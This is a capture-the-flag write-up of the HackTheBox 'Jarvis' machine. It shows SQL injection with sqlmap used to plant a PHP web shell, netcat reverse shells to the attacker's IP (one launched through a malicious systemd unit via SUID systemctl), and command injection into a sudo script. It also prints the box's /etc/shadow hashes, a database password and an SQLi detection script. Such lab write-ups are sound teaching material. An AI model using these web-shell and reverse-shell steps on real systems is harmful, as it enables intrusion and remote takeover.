### Jarvis - HacktheBox - 10.129.229.137 - supersecurehotel.htb

## Enumeration

- Nmap scan
```
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.25 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```


```
$gobuster dir -u http://supersecurehotel.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,conf,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://supersecurehotel.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,conf,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/nav.php              (Status: 200) [Size: 1333]
/phpmyadmin           (Status: 301) [Size: 333] [--> http://supersecurehotel.htb/phpmyadmin/]
/room.php             (Status: 302) [Size: 3024] [--> index.php]
Progress: 23075 / 23075 (100.00%)

===============================================================
Finished
===============================================================

```

- Found `phpmyadmin` panel and a `http://supersecurehotel.htb/room.php?cod=5` URL

- THe URL is susceptible to SQL Injection


## Shell as www-data

- Multiple ways discovered to get initial access

- I found this approach more comfortable 

- Used `Sqlmap` on the URL and instead of dumping database credential, I uploaded a php web shell

```
<?php system($_GET["cmd"]);?>

```

```
$sqlmap -u http://supersecurehotel.htb/room.php?cod=5 --random-agent --batch --file-write cmd.php --file-dest /var/www/html/non.php

```

- After successful command completion, visit `http://supersecurehotel.htb/non.php` and now we can access web shell and execute commands

![Alt text](webshell.png?raw=true "Webshell")


- Tried variety of reverse shells

- Eventually this one worked

`http://supersecurehotel.htb/non.php?cmd=nc 10.10.16.6 9000 -e bash`

```
$nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.229.137] 49892
whoami
www-data
```


## Shell as pepper

- Stabalize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`

- Enumeration

- Found credential for `phpmyadmin`

```
www-data@jarvis:/var/www/html$ cat connection.php
cat connection.php
<?php
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
?>
```

```

www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

- The script in question has the following code

```
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

- This script is susceptible to command injection

```
www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)
pepper@jarvis:~$ 
```

```
pepper@jarvis:~$ cat user.txt
cat user.txt
83****************f5
```

## Privilege escalation to root

- Tried to get better shell with `ssh-keygen` and resusing credential but none worked

- Upon enumeration, found SUID binaries for privilege escalation

```
pepper@jarvis:~/.ssh$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

https://gtfobins.github.io/gtfobins/systemctl/#suid

- So the script goes as follows:
```
pepper@jarvis:~$ cat >non.service<<EOF
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.16.6 9002'
KillMode=process
[Install]
WantedBy=multi-user.target
EOF
```

```
$ systemctl link /home/pepper/non.service
Created symlink /etc/systemd/system/non.service -> /home/pepper/non.service.
pepper@jarvis:~$ systemctl start non

```

- On the attacker machine

```
$nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.229.137] 59632

whoami
root

cat /root/root.txt
aa*********************67

```

## Beyond root

- /etc/shadow

```
root:$6$4b8khrb3$HYMrEymM/Gv0LcVdrC0L9dPal6oV4uXbQTdbSVOlWsDSlSP7QuDGp10izcfIMc16ZPr0UGZGGoWTgzPuGwg0K1:17960:0:99999:7:::
daemon:*:17957:0:99999:7:::
bin:*:17957:0:99999:7:::
sys:*:17957:0:99999:7:::
sync:*:17957:0:99999:7:::
games:*:17957:0:99999:7:::
man:*:17957:0:99999:7:::
lp:*:17957:0:99999:7:::
mail:*:17957:0:99999:7:::
news:*:17957:0:99999:7:::
uucp:*:17957:0:99999:7:::
proxy:*:17957:0:99999:7:::
www-data:*:17957:0:99999:7:::
backup:*:17957:0:99999:7:::
list:*:17957:0:99999:7:::
irc:*:17957:0:99999:7:::
gnats:*:17957:0:99999:7:::
nobody:*:17957:0:99999:7:::
systemd-timesync:*:17957:0:99999:7:::
systemd-network:*:17957:0:99999:7:::
systemd-resolve:*:17957:0:99999:7:::
systemd-bus-proxy:*:17957:0:99999:7:::
_apt:*:17957:0:99999:7:::
messagebus:*:17957:0:99999:7:::
pepper:$6$ppVlcz04$Nx619njlzUuUPZaUnKBWCiPNVngd0Zw7lgxywgZFzuCl7i9G9Ltl0TLPucaThquZhpQzoSOVglkUrbdTfjDqI1:17960:0:99999:7:::
mysql:!:17957:0:99999:7:::
sshd:*:17957:0:99999:7:::

```

- There are two files in root user's directory namely `clean.sh` and `sqli_defender.py`

- `clean.sh`

```
root@jarvis:/root# cat clean.sh
cat clean.sh
#!/bin/bash
> /var/log/apache2/access.log

```

In crontab

```
root@jarvis:/root# crontab -l | grep -v "#"
crontab -l | grep -v "#"
 */15 * * * * /root/clean.sh

```

- `sqli_defender.py`

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
from time import sleep
import os
from datetime import datetime
from datetime import timedelta
import threading
import urllib.request
import netifaces

local_ip = ''
banned = []

class LogClass:
    ip = ''
    date = ''
    code = ''
    longi = ''
    req = ''
    user_agent = ''
    so = ''
    flag = 0
    month = ''

    def __init__(self, ip, date, req, code, length, user_agent):
        self.ip = ip
        regex = '(\d+)/(.*)/(\d+):(.*) ' 
        logEx = re.match(regex, date).groups()
        self.month = str(logEx[1])
        month1 = to_dict(logEx[1])
        date = logEx[2] + '-' + month1 + '-' + logEx[0] + ' ' + logEx[3]
        self.date = date
        self.code = code
        self.length = length
        self.req = self.escape_req(req)
        self.user_agent = user_agent
        self.so = self.get_info_UA()
        self.flag = self.get_flag()
        
    def escape_req(self, req):
        if "'" in req:
            req = req.replace("'","\\'")
        return req

    def get_flag(self):
        r = urllib.parse.unquote(self.req).upper()
        flag = 0
        if self.flag != 0:
            return self.flag
        if "\'" in r or "\"" in r:
            flag = 1
        if 'ORDER' in r:
            flag = 2
        if 'UNION' in r:
            flag = 3
        if '9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23' in r:
            flag = 4
        return flag

    def get_info_UA(self):
        if 'Android' in self.user_agent:
            return 'Android'
        if 'Linux' in self.user_agent:
            return 'Linux'
        if 'Windows' in self.user_agent:
            return 'Windows'
        if 'sqlmap' in self.user_agent:
            self.flag = 4
            return 'Sqlmap'
        else:
            return 'Unknown'

def show_banner():
    print('\nSQL Injection Detector - @pepper\n---------------------------------\n\n')
    print(local_ip)
    
def to_dict(name):
	month_dict = {'Jan':'01', 'Feb':'02', 'Mar':'03', 'Apr':'04', 'May':'05', 'Jun':'06', 'Jul':'07', 'Aug':'08', 'Sep':'09', 'Oct':'10', 'Nov':'11', 'Dec':'12'}
	return month_dict[name]
    
def parse_log(line):
    try:
        regex = '(.*?) - - \[(.*?)\] "(.*?)" (\d+) (\d+) "(.*?)" "(.*?)"'
        log_ex = re.match(regex, line).groups()
        register = LogClass(log_ex[0], log_ex[1], log_ex[2], log_ex[3], log_ex[4], log_ex[6])
        return register
    except:
        return False
	
def follow(thefile):
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            sleep(0.01)
            continue
        yield line
        
def warn_log(attack):
    print('[+] Detected ' + str(attack.ip) + ' ' + str(attack.flag))
    cont = 0
    path = '/home/pepper/Web/Logs/'
    attack_date = attack.date.split('-')[0] + '-' + attack.month + '-' + attack.date.split('-')[2]
    if attack.flag == 4:
        threading.Thread(target=ban, args=(attack,)).start()
    if not os.path.isfile(path + attack.ip + '.txt'):
        f = open(path + attack.ip + '.txt', 'w')
        f.write(attack.ip + '\n' + '-------------' + '\n')
        f.close()
    else:
        f = open(path + attack.ip + '.txt', 'r')
        for i in f.readlines():
            if 'Attack' in i:
                cont = int(i.split(' ')[1])
        f.close()
    f = open(path + attack.ip + '.txt', 'a')
    f.write('Attack %d : Level %d : %s : %s\n\n' %((cont+1), attack.flag, attack_date, attack.req))
    f.close()

def ban(attack):
    num = 0
    print (local_ip)
    if not attack.ip in banned:
        banned.append(attack.ip)
        print(attack.ip)
        print(local_ip)
        os.system('iptables -t nat -I PREROUTING --src %s --dst %s -p tcp --dport 80 -j REDIRECT --to-ports 64999' %(attack.ip, local_ip))
        print('[+] %s banned' % attack.ip)
        banned_list = os.popen('iptables -t nat --line-numbers -L')
        for i in banned_list.read().split('\n'):
            if attack.ip in i:
                num = int(i.split(' ')[0])
        if num != 0:
            sleep(90)
            os.system('iptables -t nat -D PREROUTING %d' % num)
            banned.remove(attack.ip)
            print('[+] %s disbanned' % attack.ip)
    else:
        pass
        
if __name__ == '__main__':
    local_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
    time_counter = datetime.now()
    attackers = {}
    show_banner()
    logfile = open('/var/log/apache2/access.log','r')
    loglines = follow(logfile)
    for line in loglines:
        log = parse_log(line)
        if log:
            if time_counter + timedelta(seconds=8) < datetime.now():
                attackers[log.ip] = 0
                time_counter = datetime.now()
            if log.ip in attackers and 'room.php?cod' in log.req:
                attackers[log.ip] = attackers[log.ip] + 1
            else:
                attackers[log.ip] = 1
            if attackers[log.ip] > 5:
                log.flag = 4
            if log.flag != 0:
                warn_log(log)

```